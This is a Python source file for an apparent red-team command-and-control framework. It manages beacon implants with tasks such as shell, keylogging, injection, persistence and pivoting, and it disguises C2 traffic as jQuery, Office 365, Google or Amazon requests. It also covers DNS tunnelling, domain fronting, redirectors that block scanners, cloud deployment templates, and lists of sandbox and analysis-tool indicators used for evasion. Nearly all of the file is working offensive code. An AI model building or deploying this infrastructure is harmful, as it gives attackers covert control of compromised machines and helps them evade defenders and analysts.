"""
Command & Control Infrastructure Framework - Red Team Edition

Advanced C2 infrastructure management:
- Multi-protocol C2 channels (HTTP/S, DNS, ICMP, WebSocket)
- Redirector configuration and management
- Domain fronting support
- Malleable profiles for traffic shaping
- Infrastructure-as-Code deployment
- Beacon management and tasking
- Anti-forensics and cleanup

Based on modern red team infrastructure practices.
"""

import base64
import hashlib
import json
import os
import random
import secrets
import socket
import ssl
import struct
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from typing import List, Dict, Optional, Any, Callable, Tuple
from concurrent.futures import ThreadPoolExecutor
import threading


class C2Protocol(Enum):
    """C2 communication protocols."""
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    DNS_OVER_HTTPS = "doh"
    ICMP = "icmp"
    WEBSOCKET = "websocket"
    TCP_CUSTOM = "tcp_custom"
    SMTP = "smtp"
    SLACK = "slack"       # Slack webhook/bot
    DISCORD = "discord"   # Discord webhook
    TEAMS = "teams"       # MS Teams webhook


class BeaconStatus(Enum):
    """Beacon connection status."""
    ACTIVE = "active"
    DORMANT = "dormant"
    DEAD = "dead"
    COMPROMISED = "compromised"


class TaskType(Enum):
    """Beacon task types."""
    SHELL = "shell"
    DOWNLOAD = "download"
    UPLOAD = "upload"
    SCREENSHOT = "screenshot"
    KEYLOG = "keylog"
    PROCESS_LIST = "process_list"
    FILE_LIST = "file_list"
    INJECT = "inject"
    MIGRATE = "migrate"
    SLEEP = "sleep"
    EXIT = "exit"
    PERSIST = "persist"
    PIVOT = "pivot"


@dataclass
class MalleableProfile:
    """
    Malleable C2 profile for traffic shaping.
    Similar to Cobalt Strike malleable profiles.
    """
    name: str
    description: str

    # HTTP settings
    http_get_uri: List[str] = field(default_factory=lambda: ["/updates", "/news"])
    http_post_uri: List[str] = field(default_factory=lambda: ["/submit", "/api"])

    # Headers
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    headers: Dict[str, str] = field(default_factory=dict)

    # Data transformations
    transform_encode: List[str] = field(default_factory=lambda: ["base64"])
    prepend_data: str = ""
    append_data: str = ""

    # Timing
    jitter: int = 20  # Percentage
    sleep_time: int = 60  # Seconds

    # SSL/TLS
    ssl_cert: str = ""
    ssl_key: str = ""

    def generate_request(self, data: bytes, method: str = "GET") -> Dict:
        """Generate HTTP request based on profile."""
        # Encode data
        encoded = data
        for transform in self.transform_encode:
            if transform == "base64":
                encoded = base64.b64encode(encoded)
            elif transform == "hex":
                encoded = encoded.hex().encode()

        # Add prepend/append
        payload = self.prepend_data.encode() + encoded + self.append_data.encode()

        # Build request
        if method == "GET":
            uri = random.choice(self.http_get_uri)
        else:
            uri = random.choice(self.http_post_uri)

        headers = dict(self.headers)
        headers["User-Agent"] = self.user_agent

        return {
            "method": method,
            "uri": uri,
            "headers": headers,
            "body": payload if method == "POST" else None,
        }


# Pre-defined profiles mimicking legitimate traffic
MALLEABLE_PROFILES = {
    "jquery": MalleableProfile(
        name="jQuery CDN",
        description="Mimics jQuery CDN requests",
        http_get_uri=["/jquery-3.6.0.min.js", "/jquery-ui.min.js"],
        http_post_uri=["/jquery.min.map"],
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        headers={
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "https://code.jquery.com/",
        },
        prepend_data="/*! jQuery v3.6.0 */",
        append_data="//# sourceMappingURL=jquery.min.map",
    ),
    "office365": MalleableProfile(
        name="Office 365",
        description="Mimics Office 365 traffic",
        http_get_uri=["/owa/", "/EWS/Exchange.asmx", "/autodiscover/autodiscover.xml"],
        http_post_uri=["/owa/service.svc", "/EWS/Exchange.asmx"],
        user_agent="Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0)",
        headers={
            "Content-Type": "text/xml; charset=utf-8",
            "X-ClientApp": "Outlook",
        },
    ),
    "google": MalleableProfile(
        name="Google Services",
        description="Mimics Google API traffic",
        http_get_uri=["/complete/search", "/s", "/gen_204"],
        http_post_uri=["/log", "/gsi/_/signin"],
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        headers={
            "Accept": "application/json",
            "Origin": "https://www.google.com",
        },
    ),
    "amazon": MalleableProfile(
        name="Amazon",
        description="Mimics Amazon traffic",
        http_get_uri=["/gp/product", "/dp/", "/s"],
        http_post_uri=["/gp/cart/add", "/api/wishlist"],
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        headers={
            "Accept": "text/html,application/xhtml+xml",
            "Accept-Language": "en-US,en;q=0.9",
        },
    ),
}


@dataclass
class Redirector:
    """
    Traffic redirector configuration.
    Acts as a proxy between beacons and C2 server.
    """
    id: str
    hostname: str
    ip: str
    protocol: C2Protocol
    port: int
    backend_server: str
    backend_port: int
    ssl_enabled: bool = True
    geo_filter: List[str] = field(default_factory=list)  # Country codes to allow
    ip_whitelist: List[str] = field(default_factory=list)
    active: bool = True

    def generate_nginx_config(self) -> str:
        """Generate nginx configuration for this redirector."""
        config = f"""
server {{
    listen {self.port} {'ssl' if self.ssl_enabled else ''};
    server_name {self.hostname};

    {'ssl_certificate /etc/nginx/ssl/cert.pem;' if self.ssl_enabled else ''}
    {'ssl_certificate_key /etc/nginx/ssl/key.pem;' if self.ssl_enabled else ''}

    # Geo filtering
    {''.join([f"allow {ip};" for ip in self.ip_whitelist]) if self.ip_whitelist else ''}

    location / {{
        # Block common scanners
        if ($http_user_agent ~* (bot|crawler|spider|scan)) {{
            return 444;
        }}

        proxy_pass {'https' if self.ssl_enabled else 'http'}://{self.backend_server}:{self.backend_port};
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_ssl_verify off;
    }}
}}
"""
        return config

    def generate_apache_config(self) -> str:
        """Generate Apache configuration for this redirector."""
        config = f"""
<VirtualHost *:{self.port}>
    ServerName {self.hostname}

    {'SSLEngine on' if self.ssl_enabled else ''}
    {'SSLCertificateFile /etc/apache2/ssl/cert.pem' if self.ssl_enabled else ''}
    {'SSLCertificateKeyFile /etc/apache2/ssl/key.pem' if self.ssl_enabled else ''}

    ProxyPreserveHost On
    ProxyPass / {'https' if self.ssl_enabled else 'http'}://{self.backend_server}:{self.backend_port}/
    ProxyPassReverse / {'https' if self.ssl_enabled else 'http'}://{self.backend_server}:{self.backend_port}/

    # Block scanners
    RewriteEngine On
    RewriteCond %{{HTTP_USER_AGENT}} (bot|crawler|spider|scan) [NC]
    RewriteRule .* - [F]
</VirtualHost>
"""
        return config

    def generate_socat_command(self) -> str:
        """Generate socat command for simple port forwarding."""
        if self.ssl_enabled:
            return (f"socat OPENSSL-LISTEN:{self.port},reuseaddr,fork,"
                   f"cert=server.pem,verify=0 "
                   f"TCP:{self.backend_server}:{self.backend_port}")
        else:
            return (f"socat TCP-LISTEN:{self.port},reuseaddr,fork "
                   f"TCP:{self.backend_server}:{self.backend_port}")


@dataclass
class Beacon:
    """
    Beacon (implant) representation.
    """
    id: str
    hostname: str
    ip: str
    os: str
    user: str
    process: str
    pid: int
    architecture: str
    first_seen: float
    last_seen: float
    sleep_time: int
    jitter: int
    status: BeaconStatus = BeaconStatus.ACTIVE
    parent_beacon: Optional[str] = None  # For pivoting
    tasks: List[Dict] = field(default_factory=list)
    completed_tasks: List[Dict] = field(default_factory=list)

    def is_alive(self, threshold_minutes: int = 10) -> bool:
        """Check if beacon is still active based on last check-in."""
        threshold = threshold_minutes * 60
        return (time.time() - self.last_seen) < threshold

    def queue_task(self, task_type: TaskType, arguments: Dict = None) -> str:
        """Queue a task for this beacon."""
        task_id = str(uuid.uuid4())[:8]
        task = {
            "id": task_id,
            "type": task_type.value,
            "arguments": arguments or {},
            "queued_at": time.time(),
            "status": "pending",
        }
        self.tasks.append(task)
        return task_id


@dataclass
class DomainFrontingConfig:
    """
    Domain fronting configuration.
    """
    cdn_provider: str  # cloudfront, azure, cloudflare, fastly
    front_domain: str  # Legitimate high-reputation domain
    actual_domain: str  # Your C2 domain
    host_header: str   # Host header value

    def generate_curl_test(self) -> str:
        """Generate curl command to test domain fronting."""
        return (f'curl -H "Host: {self.host_header}" '
               f'https://{self.front_domain}/ -v')

    def get_connection_info(self) -> Dict:
        """Get connection information for beacon config."""
        return {
            "server": self.front_domain,
            "host_header": self.host_header,
            "actual_host": self.actual_domain,
        }


class DNSChannel:
    """
    DNS-based C2 channel implementation.
    """

    # Record type mappings
    RECORD_TYPES = {
        "A": 1,
        "TXT": 16,
        "AAAA": 28,
        "CNAME": 5,
    }

    def __init__(self, domain: str, nameserver: str = "8.8.8.8"):
        self.domain = domain
        self.nameserver = nameserver
        self.chunk_size = 63  # Max label size in DNS

    def encode_data(self, data: bytes) -> List[str]:
        """Encode data into DNS-safe labels."""
        # Base32 encode (DNS safe)
        encoded = base64.b32encode(data).decode().lower().rstrip("=")

        # Split into chunks
        chunks = [encoded[i:i+self.chunk_size]
                 for i in range(0, len(encoded), self.chunk_size)]

        return chunks

    def decode_data(self, labels: List[str]) -> bytes:
        """Decode data from DNS labels."""
        encoded = "".join(labels).upper()
        # Add padding
        padding = (8 - len(encoded) % 8) % 8
        encoded += "=" * padding

        return base64.b32decode(encoded)

    def build_query(self, data: bytes, query_id: int = None) -> bytes:
        """Build DNS query with encoded data."""
        if query_id is None:
            query_id = random.randint(0, 65535)

        chunks = self.encode_data(data)
        subdomain = ".".join(chunks)
        qname = f"{subdomain}.{self.domain}"

        # Build DNS query packet
        packet = struct.pack(">H", query_id)  # ID
        packet += struct.pack(">H", 0x0100)   # Flags (standard query)
        packet += struct.pack(">HHHH", 1, 0, 0, 0)  # QD, AN, NS, AR count

        # QNAME
        for label in qname.split("."):
            packet += struct.pack("B", len(label))
            packet += label.encode()
        packet += b"\x00"  # Null terminator

        # QTYPE and QCLASS
        packet += struct.pack(">HH", 16, 1)  # TXT, IN

        return packet

    def parse_response(self, response: bytes) -> Optional[bytes]:
        """Parse DNS response and extract data."""
        try:
            # Skip header and question section
            offset = 12

            # Skip question
            while response[offset] != 0:
                offset += response[offset] + 1
            offset += 5  # Null byte + QTYPE + QCLASS

            # Parse answer
            if len(response) > offset:
                # Skip name pointer
                offset += 2
                # Skip TYPE, CLASS, TTL
                offset += 8
                # Get RDLENGTH
                rdlen = struct.unpack(">H", response[offset:offset+2])[0]
                offset += 2
                # Get TXT data (first byte is length)
                txt_len = response[offset]
                txt_data = response[offset+1:offset+1+txt_len]
                return txt_data
        except Exception:
            pass
        return None


class C2Server:
    """
    C2 server management.
    """

    def __init__(self, server_id: str = None):
        self.server_id = server_id or str(uuid.uuid4())[:8]
        self.beacons: Dict[str, Beacon] = {}
        self.redirectors: Dict[str, Redirector] = {}
        self.active_profile: MalleableProfile = MALLEABLE_PROFILES["jquery"]
        self.listeners: List[Dict] = []
        self.logs: List[Dict] = []

        # Crypto keys
        self.server_key = secrets.token_bytes(32)

        # Statistics
        self.stats = {
            "total_beacons": 0,
            "active_beacons": 0,
            "tasks_issued": 0,
            "data_received": 0,
        }

    def add_redirector(self, hostname: str, ip: str,
                       protocol: C2Protocol = C2Protocol.HTTPS,
                       port: int = 443) -> Redirector:
        """Add a redirector to the infrastructure."""
        redirector = Redirector(
            id=str(uuid.uuid4())[:8],
            hostname=hostname,
            ip=ip,
            protocol=protocol,
            port=port,
            backend_server="localhost",
            backend_port=8080,
        )
        self.redirectors[redirector.id] = redirector
        return redirector

    def register_beacon(self, hostname: str, ip: str, os: str,
                        user: str, process: str, pid: int,
                        architecture: str = "x64") -> Beacon:
        """Register a new beacon."""
        beacon = Beacon(
            id=str(uuid.uuid4())[:8],
            hostname=hostname,
            ip=ip,
            os=os,
            user=user,
            process=process,
            pid=pid,
            architecture=architecture,
            first_seen=time.time(),
            last_seen=time.time(),
            sleep_time=self.active_profile.sleep_time,
            jitter=self.active_profile.jitter,
        )
        self.beacons[beacon.id] = beacon
        self.stats["total_beacons"] += 1
        self.stats["active_beacons"] += 1

        self._log("beacon_registered", {"beacon_id": beacon.id, "hostname": hostname})
        return beacon

    def checkin_beacon(self, beacon_id: str,
                       task_results: List[Dict] = None) -> List[Dict]:
        """Process beacon check-in and return pending tasks."""
        beacon = self.beacons.get(beacon_id)
        if not beacon:
            return []

        beacon.last_seen = time.time()
        beacon.status = BeaconStatus.ACTIVE

        # Process completed tasks
        if task_results:
            for result in task_results:
                task_id = result.get("task_id")
                # Find and update task
                for task in beacon.tasks:
                    if task["id"] == task_id:
                        task["status"] = "completed"
                        task["result"] = result.get("output")
                        task["completed_at"] = time.time()
                        beacon.completed_tasks.append(task)
                        beacon.tasks.remove(task)
                        break

        # Return pending tasks
        pending = [t for t in beacon.tasks if t["status"] == "pending"]
        for task in pending:
            task["status"] = "issued"
            self.stats["tasks_issued"] += 1

        return pending

    def task_beacon(self, beacon_id: str, task_type: TaskType,
                    arguments: Dict = None) -> Optional[str]:
        """Issue a task to a beacon."""
        beacon = self.beacons.get(beacon_id)
        if not beacon:
            return None

        task_id = beacon.queue_task(task_type, arguments)
        self._log("task_issued", {
            "beacon_id": beacon_id,
            "task_id": task_id,
            "type": task_type.value
        })
        return task_id

    def task_all_beacons(self, task_type: TaskType,
                         arguments: Dict = None,
                         filter_os: str = None) -> List[str]:
        """Issue a task to all active beacons."""
        task_ids = []

        for beacon in self.beacons.values():
            if beacon.status != BeaconStatus.ACTIVE:
                continue
            if filter_os and filter_os.lower() not in beacon.os.lower():
                continue

            task_id = self.task_beacon(beacon.id, task_type, arguments)
            if task_id:
                task_ids.append(task_id)

        return task_ids

    def get_active_beacons(self) -> List[Beacon]:
        """Get list of active beacons."""
        active = []
        for beacon in self.beacons.values():
            if beacon.is_alive():
                beacon.status = BeaconStatus.ACTIVE
                active.append(beacon)
            else:
                beacon.status = BeaconStatus.DORMANT

        self.stats["active_beacons"] = len(active)
        return active

    def create_pivot(self, beacon_id: str, target_ip: str,
                     target_port: int) -> Dict:
        """Create a pivot through a beacon."""
        beacon = self.beacons.get(beacon_id)
        if not beacon:
            return {"error": "Beacon not found"}

        # Task beacon to create SOCKS proxy or port forward
        task_id = self.task_beacon(beacon_id, TaskType.PIVOT, {
            "target": target_ip,
            "port": target_port,
            "type": "socks5"
        })

        return {
            "pivot_beacon": beacon_id,
            "target": f"{target_ip}:{target_port}",
            "task_id": task_id,
        }

    def _log(self, event_type: str, data: Dict):
        """Log an event."""
        self.logs.append({
            "timestamp": datetime.utcnow().isoformat(),
            "type": event_type,
            "data": data
        })

    def set_profile(self, profile_name: str):
        """Set the active malleable profile."""
        if profile_name in MALLEABLE_PROFILES:
            self.active_profile = MALLEABLE_PROFILES[profile_name]

    def generate_beacon_config(self, protocol: C2Protocol = C2Protocol.HTTPS,
                               redirector_id: str = None) -> Dict:
        """Generate configuration for new beacon."""
        if redirector_id and redirector_id in self.redirectors:
            redirector = self.redirectors[redirector_id]
            server = redirector.hostname
            port = redirector.port
        else:
            server = "localhost"
            port = 8080

        return {
            "server": server,
            "port": port,
            "protocol": protocol.value,
            "profile": {
                "uris": self.active_profile.http_get_uri,
                "user_agent": self.active_profile.user_agent,
                "headers": self.active_profile.headers,
            },
            "sleep": self.active_profile.sleep_time,
            "jitter": self.active_profile.jitter,
            "key": base64.b64encode(self.server_key).decode(),
        }

    def export_infrastructure(self) -> Dict:
        """Export infrastructure configuration."""
        return {
            "server_id": self.server_id,
            "profile": self.active_profile.name,
            "redirectors": [
                {
                    "id": r.id,
                    "hostname": r.hostname,
                    "ip": r.ip,
                    "protocol": r.protocol.value,
                    "port": r.port,
                    "active": r.active,
                }
                for r in self.redirectors.values()
            ],
            "beacons": [
                {
                    "id": b.id,
                    "hostname": b.hostname,
                    "ip": b.ip,
                    "user": b.user,
                    "status": b.status.value,
                    "last_seen": b.last_seen,
                }
                for b in self.beacons.values()
            ],
            "stats": self.stats,
        }


class InfrastructureDeployer:
    """
    Infrastructure-as-Code deployment for C2 infrastructure.
    """

    # Cloud provider templates
    TERRAFORM_TEMPLATES = {
        "aws_redirector": """
resource "aws_instance" "redirector_{id}" {{
  ami           = "ami-0c55b159cbfafe1f0"  # Amazon Linux 2
  instance_type = "t2.micro"

  vpc_security_group_ids = [aws_security_group.redirector_sg.id]

  user_data = <<-EOF
              #!/bin/bash
              yum install -y nginx
              systemctl enable nginx
              # Configure nginx
              cat > /etc/nginx/conf.d/redirect.conf << 'NGINX'
              {nginx_config}
              NGINX
              systemctl start nginx
              EOF

  tags = {{
    Name = "redirector-{id}"
  }}
}}
""",
        "aws_c2": """
resource "aws_instance" "c2_server" {{
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.medium"

  vpc_security_group_ids = [aws_security_group.c2_sg.id]

  tags = {{
    Name = "c2-server"
  }}
}}

resource "aws_security_group" "c2_sg" {{
  name        = "c2-security-group"
  description = "Security group for C2 server"

  ingress {{
    from_port   = 8080
    to_port     = 8080
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]  # Restrict in production
  }}

  egress {{
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }}
}}
""",
    }

    def __init__(self, c2_server: C2Server):
        self.c2_server = c2_server

    def generate_terraform(self, provider: str = "aws") -> str:
        """Generate Terraform configuration for infrastructure."""
        config = f"""
terraform {{
  required_providers {{
    {provider} = {{
      source  = "hashicorp/{provider}"
      version = "~> 4.0"
    }}
  }}
}}

provider "{provider}" {{
  region = "us-east-1"
}}

"""
        # Add C2 server
        config += self.TERRAFORM_TEMPLATES.get(f"{provider}_c2", "")

        # Add redirectors
        for redirector in self.c2_server.redirectors.values():
            nginx_config = redirector.generate_nginx_config().replace("\n", "\\n")
            template = self.TERRAFORM_TEMPLATES.get(f"{provider}_redirector", "")
            config += template.format(
                id=redirector.id,
                nginx_config=nginx_config
            )

        return config

    def generate_ansible(self) -> str:
        """Generate Ansible playbook for infrastructure setup."""
        playbook = """
---
- name: Deploy C2 Infrastructure
  hosts: all
  become: yes

  tasks:
    - name: Install required packages
      apt:
        name:
          - nginx
          - python3
          - python3-pip
        state: present
        update_cache: yes

    - name: Configure nginx
      template:
        src: nginx.conf.j2
        dest: /etc/nginx/conf.d/redirect.conf
      notify: restart nginx

    - name: Start nginx
      service:
        name: nginx
        state: started
        enabled: yes

  handlers:
    - name: restart nginx
      service:
        name: nginx
        state: restarted
"""
        return playbook

    def generate_docker_compose(self) -> str:
        """Generate Docker Compose configuration."""
        compose = """
version: '3.8'

services:
  c2_server:
    build: ./c2
    ports:
      - "8080:8080"
    volumes:
      - ./data:/data
    environment:
      - C2_PROFILE=jquery
    networks:
      - c2_network

  redirector_nginx:
    image: nginx:latest
    ports:
      - "443:443"
    volumes:
      - ./nginx.conf:/etc/nginx/conf.d/default.conf
      - ./ssl:/etc/nginx/ssl
    depends_on:
      - c2_server
    networks:
      - c2_network

networks:
  c2_network:
    driver: bridge
"""
        return compose


class OperationalSecurity:
    """
    OPSEC utilities for C2 operations.
    """

    @staticmethod
    def generate_random_sleep(base_sleep: int, jitter: int) -> int:
        """Generate randomized sleep time with jitter."""
        jitter_range = base_sleep * (jitter / 100)
        return int(base_sleep + random.uniform(-jitter_range, jitter_range))

    @staticmethod
    def validate_user_agent(user_agent: str, os_type: str) -> bool:
        """Validate user agent matches claimed OS."""
        os_indicators = {
            "windows": ["Windows NT", "Win64", "WOW64"],
            "linux": ["Linux", "X11"],
            "macos": ["Mac OS X", "Macintosh"],
        }

        for os_name, indicators in os_indicators.items():
            if os_name in os_type.lower():
                return any(ind in user_agent for ind in indicators)

        return True  # Can't validate, assume ok

    @staticmethod
    def check_sandbox_indicators() -> List[str]:
        """Check for sandbox/analysis indicators."""
        indicators = []

        # Check process count (sandboxes often have few processes)
        # Would implement actual checks

        # Check for common analysis tools
        analysis_tools = [
            "procmon", "procexp", "wireshark", "fiddler",
            "x64dbg", "ollydbg", "ida", "ghidra"
        ]

        # Check for VM artifacts
        vm_indicators = [
            "vmware", "virtualbox", "qemu", "xen", "hyperv"
        ]

        return indicators

    @staticmethod
    def generate_decoy_traffic() -> List[Dict]:
        """Generate decoy network requests to blend in."""
        decoy_sites = [
            "https://www.google.com/search?q=weather",
            "https://www.bing.com/search?q=news",
            "https://www.microsoft.com/en-us/",
            "https://docs.python.org/3/",
        ]

        return [{"url": url, "method": "GET"} for url in decoy_sites]


# Convenience functions
def create_c2_server() -> C2Server:
    """Create a new C2 server instance."""
    return C2Server()


def create_redirector(c2: C2Server, hostname: str, ip: str) -> Redirector:
    """Add a redirector to C2 server."""
    return c2.add_redirector(hostname, ip)


def deploy_infrastructure(c2: C2Server, provider: str = "aws") -> str:
    """Generate deployment configuration."""
    deployer = InfrastructureDeployer(c2)
    return deployer.generate_terraform(provider)
